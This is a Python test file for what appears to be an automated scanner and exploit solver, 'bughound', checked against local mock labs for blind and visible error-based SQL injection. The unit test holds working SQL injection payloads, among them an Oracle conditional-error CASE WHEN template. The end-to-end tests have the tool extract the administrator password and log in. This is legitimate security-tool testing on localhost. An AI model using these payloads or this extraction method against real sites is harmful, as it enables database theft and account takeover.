"""END-TO-END: 'Blind SQL injection with conditional errors' must solve.

The 1.1.0 solver failed this whole lab family: the oracle hides in HTTP
status flips (200 vs 500) and boolean payloads produce NO page differential,
so the ladder's first strategy bailed after 5 requests and every other
strategy ran against the wrong bug class. These tests pin the fix:

1. unit: the conditional-error calibration signature (broken quote -> 5xx,
   doubled quote -> 2xx) and the Oracle CASE-WHEN template distinguish
   TRUE from FALSE by status alone on the mock;
2. e2e: the FULL pipeline -- crawl, detection (which legitimately misses
   here), solve ladder -- must calibrate the error oracle, binary-search
   the administrator password through conditional 500s, log in, and flip
   the mock's own solved banner.
"""

from __future__ import annotations

import asyncio

from mock_academy import (
    BLIND_ERROR_TITLE,
    build_blind_error_lab,
    lab_server,
)

from bughound.authorization import Scope
from bughound.engine import run_scan
from bughound.exploits.sqli import calibrate_error_oracle
from bughound.models import Category, ScanConfig, Target
from bughound.modules.base import RequestTarget, ScanContext
from bughound.http_client import HttpClient


def _config(base: str) -> ScanConfig:
    return ScanConfig(
        target_url=base,
        aggressive=True,
        exploit=True,
        use_external_tools=False,
        max_urls=20,
        max_depth=2,
        timeout=15,
        solve_budget=260,
    )


def _target(base: str) -> Target:
    from urllib.parse import urlparse

    p = urlparse(base)
    return Target(
        url=base,
        scheme=p.scheme or "http",
        host=p.hostname or "127.0.0.1",
        port=p.port or (443 if p.scheme == "https" else 80),
        authorized=True,
        authorization_note="e2e mock lab",
    )


def _scope() -> Scope:
    return Scope(allowed_hosts=["127.0.0.1"], note="e2e mock lab")


def _run(base: str):
    return asyncio.run(run_scan(_config(base), _scope(), confirmed=True, progress=lambda m: None))


def _mock_query(value: str) -> bool:
    """Mirror of the mock's string-literal scanner for signature tests."""
    src = "'" + value + "'"
    inside = False
    i = 0
    while i < len(src):
        c = src[i]
        if inside:
            if c == "'":
                if i + 1 < len(src) and src[i + 1] == "'":
                    i += 2
                    continue
                inside = False
        else:
            if c == "'":
                inside = True
        i += 1
    return not inside


def test_quote_balance_signature():
    """The calibration primitives: broken quote errors, doubled quote fixes."""
    assert not _mock_query("abc'")          # broken -> 500
    assert _mock_query("abc''")             # fixed -> 200
    assert _mock_query("abc")               # pristine -> 200
    # Boolean payloads parse fine on BOTH sides -> no differential possible.
    assert _mock_query("abc' AND '1'='1")
    assert _mock_query("abc' AND '1'='2")
    # The Oracle conditional-error template parses on both polarities.
    tpl = "abc'||(SELECT CASE WHEN ({c}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    assert _mock_query(tpl.format(c="1=1"))
    assert _mock_query(tpl.format(c="1=2"))


def test_e2e_blind_error_lab_solves():
    app, state, password = build_blind_error_lab()
    with lab_server(app) as base:
        result = _run(base)
        assert state.solved, "blind-SQLi conditional-errors lab banner never flipped"
        assert result.objective and result.objective.get("solved_after") is True
        assert result.objective.get("title") == BLIND_ERROR_TITLE
        # The error oracle finding must be recorded with the injection point.
        err_sqli = [
            f for f in result.findings
            if f.category == Category.SQLI and "Error-based blind SQL injection" in f.title
        ]
        assert err_sqli, "no error-based SQLi finding recorded"


def test_calibrate_error_oracle_directly():
    """The calibration must confirm the Oracle template against the mock."""
    app, _state, _pw = build_blind_error_lab()
    with lab_server(app) as base:

        async def probe():
            client = HttpClient(timeout=10)
            ctx = ScanContext(
                client=client,
                base_url=base,
                config=_config(base),
                target=_target(base),
            )
            try:
                await client.get(base)  # seed visit sets the TrackingId jar cookie
                rt = RequestTarget(url=base, method="GET", params={}, source="seed")
                return await calibrate_error_oracle(ctx, rt, "cookie:TrackingId")
            finally:
                await client.aclose()

        oracle = asyncio.run(probe())
        assert oracle is not None, "conditional-error oracle not calibrated"
        assert oracle.dialect == "Oracle"


def test_e2e_visible_error_lab_solves():
    """'Visible error-based SQL injection' must solve via the one-shot leak.

    The mock reproduces the two live-measured traps: the lab frontend
    truncates cookie values at 60 characters (so the classic long payloads
    arrive broken and the solver MUST use a short synthetic base value with
    LIMIT/OFFSET expressions), and the value is leaked inside the reflected
    PostgreSQL error text. The full pipeline must leak administrator's
    password in a handful of requests, log in, and flip the banner.
    """
    from mock_academy import build_visible_error_lab

    app, state, password = build_visible_error_lab()
    with lab_server(app) as base:
        result = _run(base)
        assert state.solved, "visible-error lab banner never flipped"
        assert result.objective and result.objective.get("solved_after") is True
        assert result.objective.get("title") == "Visible error-based SQL injection"
        err_sqli = [
            f for f in result.findings
            if f.category == Category.SQLI and "Error-based blind SQL injection" in f.title
        ]
        assert err_sqli, "no error-based SQLi finding recorded"
        leaked = [f for f in err_sqli if f.exploit_status == "succeeded"]
        assert leaked and any(password in line for f in leaked for line in f.extracted_data), (
            "the leaked password never made it into the evidence"
        )


def test_visible_leak_direct():
    """Direct: the leak engine extracts administrator's password in <=6 requests."""
    from mock_academy import build_visible_error_lab

    from bughound.exploits.sqli import leak_via_visible_error

    app, _state, password = build_visible_error_lab()
    with lab_server(app) as base:

        async def probe():
            client = HttpClient(timeout=10)
            ctx = ScanContext(
                client=client,
                base_url=base,
                config=_config(base),
                target=_target(base),
            )
            try:
                await client.get(base)  # seed visit sets the TrackingId cookie
                rt = RequestTarget(url=base, method="GET", params={}, source="seed")
                budget = [20]
                return await leak_via_visible_error(ctx, rt, "cookie:TrackingId", budget), 20 - budget[0]
            finally:
                await client.aclose()

        leaked, used = asyncio.run(probe())
        assert leaked is not None, "visible-error leak did not fire"
        username, value, dialect, _payload = leaked
        assert username == "administrator"
        assert value == password
        assert dialect == "PostgreSQL"
        assert used <= 6, f"leak used {used} requests; expected the one-shot path"
